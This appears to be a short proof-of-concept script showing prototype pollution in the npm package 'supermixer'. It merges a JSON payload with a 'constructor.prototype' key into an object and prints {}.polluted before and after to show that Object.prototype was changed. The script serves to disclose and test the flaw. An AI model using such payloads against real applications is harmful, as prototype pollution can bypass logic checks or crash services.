var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
mixer.merge(obj, JSON.parse(payload));
console.log({}.polluted);